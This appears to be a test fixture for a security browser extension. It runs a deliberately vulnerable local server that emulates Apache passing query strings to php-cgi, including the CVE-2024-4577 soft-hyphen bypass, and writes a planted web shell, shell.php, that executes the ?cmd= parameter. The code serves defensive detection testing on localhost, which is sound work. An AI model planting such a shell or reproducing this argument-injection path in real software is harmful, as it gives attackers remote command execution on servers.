/* =============================================================================
 *  PHP2Shell Extension — test target: a faithful "Apache + php-cgi" emulator
 * =============================================================================
 *
 *  ⚠️  AUTHORIZED USE ONLY. This file spins up a LOCAL, vulnerable web server
 *  on 127.0.0.1 so the extension can be tested against something real instead
 *  of a mock. It never binds to a public interface.
 *
 *  Why this exists
 *  ---------------
 *  The extension's detection logic targets CVE-2024-4577 style php-cgi
 *  argument injection. Exploiting it needs the web server to forward the
 *  request's query string to the CGI binary as command-line arguments.
 *
 *  Apache does that in modules/generators/mod_cgi.c (default_build_command):
 *
 *      if (r->args && r->args[0] && !ap_strchr_c(r->args, '=')) {
 *          args = r->args;                      // only when there is NO literal '='
 *      }
 *      for (x = 1, idx = 1; x < numwords; x++) {
 *          w = ap_getword_nulls(p, &args, '+'); // split on '+'
 *          ap_unescape_url(w);                  // %3d -> '='
 *          (*argv)[idx++] = ap_escape_shell_cmd(p, w);
 *      }
 *
 *  On top of that, php-cgi itself refuses to parse those arguments when the
 *  decoded QUERY_STRING starts with a hyphen (the CVE-2012-1823 mitigation):
 *
 *      if ((query_string = getenv("QUERY_STRING")) != NULL &&
 *          strchr(query_string, '=') == NULL) {
 *          php_url_decode(...);
 *          if (*p == '-') skip_getopt = 1;      // <- arguments are ignored
 *      }
 *
 *  CVE-2024-4577 is the Windows bypass of exactly that mitigation: on Windows
 *  the UCS-2 -> ANSI "Best-Fit" mapping turns the soft hyphen U+00AD (0xAD)
 *  into a real hyphen (0x2D) for code pages 932/936/950, while the
 *  QUERY_STRING environment variable still contains 0xAD — so the check does
 *  not trigger but the option is parsed.
 *
 *  This emulator implements BOTH behaviours:
 *    mode 'unix'    — Apache on Linux: '+'-split, plain '-', php-cgi blocks it.
 *    mode 'windows' — Apache on Windows with a CJK code page: '+'-split and the
 *                      0xAD -> 0x2D best-fit conversion.
 *
 *  It then execs the real php-cgi binary with the CGI environment and the
 *  request body on stdin (php://input).
 * =============================================================================
 */

'use strict';

const http = require('http');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

/** Locate a php-cgi binary (override with PHP_CGI=/path/to/php-cgi). */
function findPhpCgi() {
  const candidates = [
    process.env.PHP_CGI,
    '/tmp/downloads/php-8.3.7/sapi/cgi/php-cgi',
    '/tmp/php-8.3.16/sapi/cgi/php-cgi',
    '/usr/bin/php-cgi',
    '/usr/local/bin/php-cgi'
  ].filter(Boolean);
  for (const c of candidates) {
    try {
      fs.accessSync(c, fs.constants.X_OK);
      return c;
    } catch (e) { /* next */ }
  }
  return null;
}

/**
 * Reproduce Apache's mod_cgi argument construction.
 * @param {string} rawQueryString  the raw query string (still percent-encoded)
 * @param {string} mode  'unix' | 'windows'
 * @returns {string[]} extra argv elements (may be empty)
 */
function apacheBuildArgs(rawQueryString, mode = 'unix') {
  if (!rawQueryString || rawQueryString.indexOf('=') !== -1) return [];
  const words = [];
  let rest = rawQueryString;
  while (rest.length) {
    const idx = rest.indexOf('+');
    let word = idx === -1 ? rest : rest.slice(0, idx);
    rest = idx === -1 ? '' : rest.slice(idx + 1);
    // ap_unescape_url: %XX -> byte. '+' is NOT decoded to a space by Apache here.
    word = word.replace(/%([0-9A-Fa-f]{2})/g, (_m, hex) =>
      String.fromCharCode(parseInt(hex, 16)));
    // Windows "Best-Fit": U+00AD (soft hyphen) -> '-' under code pages 932/936/950.
    if (mode === 'windows') word = word.replace(/\u00AD/g, '-');
    words.push(word);
  }
  return words;
}

/** Create the docroot with ordinary PHP pages plus a classic web shell. */
function makeDocroot() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'p2s-docroot-'));
  fs.writeFileSync(path.join(root, 'index.php'),
    '<?php echo "Welcome to the demo intranet"; ?>\n' +
    '<html><body><h1>IT Intranet</h1><p>Staff portal</p></body></html>\n');
  fs.writeFileSync(path.join(root, 'info.php'), '<?php phpinfo(); ?>\n');
  fs.writeFileSync(path.join(root, 'login.php'),
    '<?php echo "login form"; ?>\n' +
    '<form method="post" action="/login.php"><input name="user"><input name="pass" type="password"></form>\n');

  /* A classic pre-planted web shell — this is the "PHP2Shell" scenario the
   * extension has to recognise: an existing ?cmd= channel. */
  fs.writeFileSync(path.join(root, 'shell.php'),
    '<?php\n' +
    'if (isset($_REQUEST["cmd"])) { echo shell_exec($_REQUEST["cmd"]); }\n' +
    'else { echo "shell ready"; }\n');

  return root;
}

/**
 * Start the vulnerable server.
 * @param {object} opts { phpCgi, docroot, port, mode }
 */
function startServer(opts = {}) {
  const phpCgi = opts.phpCgi || findPhpCgi();
  if (!phpCgi) throw new Error('php-cgi binary not found (set PHP_CGI=...)');

  const docroot = opts.docroot || makeDocroot();
  const mode = opts.mode || 'windows';

  const server = http.createServer((req, res) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const rawUrl = req.url || '/';
      const qIdx = rawUrl.indexOf('?');
      const rawPath = qIdx === -1 ? rawUrl : rawUrl.slice(0, qIdx);
      const rawQuery = qIdx === -1 ? '' : rawUrl.slice(qIdx + 1);

      const script = path.join(docroot, path.normalize(rawPath).replace(/^([/\\])+/, ''));
      if (!script.startsWith(docroot) || !fs.existsSync(script)) {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
        return;
      }

      /* --- the vulnerable part: query string -> CGI argv ---------------- */
      const extraArgs = apacheBuildArgs(rawQuery, mode);

      const env = Object.assign({}, process.env, {
        GATEWAY_INTERFACE: 'CGI/1.1',
        SERVER_PROTOCOL: 'HTTP/1.1',
        SERVER_SOFTWARE: 'Apache/2.4.58 (Debian)',
        SERVER_NAME: '127.0.0.1',
        SERVER_PORT: String(opts.port || 0),
        SERVER_ADDR: '127.0.0.1',
        DOCUMENT_ROOT: docroot,
        SCRIPT_FILENAME: script,
        SCRIPT_NAME: rawPath,
        PATH_INFO: '',
        REQUEST_METHOD: req.method,
        REQUEST_URI: rawUrl,
        QUERY_STRING: rawQuery,
        REDIRECT_STATUS: '200',
        HTTP_HOST: req.headers.host || '127.0.0.1',
        CONTENT_TYPE: req.headers['content-type'] || '',
        CONTENT_LENGTH: String(body.length)
      });
      delete env.LD_PRELOAD;

      /* NOTE: no '-f <script>' — Apache runs the CGI binary and lets it pick the
       * script up from SCRIPT_FILENAME. Keeping the option order intact matters:
       * php_getopt() stops at the first non-option argument, so anything that is
       * not an option has to come last. */
      const child = spawn(phpCgi, ['-d', 'cgi.force_redirect=0', ...extraArgs], {
        env,
        stdio: ['pipe', 'pipe', 'pipe']
      });

      let out = Buffer.alloc(0);
      let err = Buffer.alloc(0);
      child.stdout.on('data', (d) => { out = Buffer.concat([out, d]); });
      child.stderr.on('data', (d) => { err = Buffer.concat([err, d]); });

      child.on('close', () => {
        /* Split the CGI response into headers and body. */
        const text = out.toString('utf8');
        const sep = text.indexOf('\r\n\r\n');
        const headerBlock = sep === -1 ? '' : text.slice(0, sep);
        const responseBody = sep === -1 ? text : text.slice(0, sep);
        const bodyText = sep === -1 ? text : text.slice(sep + 4);

        const headers = { 'Content-Type': 'text/html; charset=UTF-8' };
        headerBlock.split(/\r\n/).forEach((line) => {
          const i = line.indexOf(':');
          if (i > 0) headers[line.slice(0, i).trim()] = line.slice(i + 1).trim();
        });

        res.writeHead(200, headers);
        res.end(bodyText);
      });

      if (body.length) child.stdin.write(body);
      child.stdin.end();
    });
  });

  return new Promise((resolve) => {
    server.listen(opts.port || 0, '127.0.0.1', () => {
      const port = server.address().port;
      resolve({
        server,
        port,
        mode,
        origin: `http://127.0.0.1:${port}`,
        phpCgi,
        docroot,
        close: () => new Promise((r) => {
          /* undici keeps sockets alive; without this server.close() would
           * never settle after the event loop has drained. */
          if (typeof server.closeAllConnections === 'function') server.closeAllConnections();
          server.close(r);
        })
      });
    });
  });
}

/** A plain, non-PHP server used for the negative ("secure") test. */
function startPlainServer() {
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html', 'Server': 'nginx/1.24.0' });
    res.end('<html><body><h1>Static site</h1><p>Nothing to see here.</p></body></html>');
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const port = server.address().port;
      resolve({
        server,
        port,
        origin: `http://127.0.0.1:${port}`,
        close: () => new Promise((r) => {
          /* undici keeps sockets alive; without this server.close() would
           * never settle after the event loop has drained. */
          if (typeof server.closeAllConnections === 'function') server.closeAllConnections();
          server.close(r);
        })
      });
    });
  });
}

module.exports = { startServer, startPlainServer, apacheBuildArgs, findPhpCgi, makeDocroot };

if (require.main === module) {
  const mode = process.argv.includes('--unix') ? 'unix' : 'windows';
  startServer({ port: Number(process.env.PORT || 8080), mode }).then((s) => {
    console.log(`[p2s-test] php-cgi target (${s.mode} mode) on ${s.origin}`);
    console.log(`[p2s-test] php-cgi: ${s.phpCgi}`);
    console.log(`[p2s-test] docroot : ${s.docroot}`);
    console.log('[p2s-test] pages   : /index.php /shell.php (?cmd=) /info.php');
  });
}
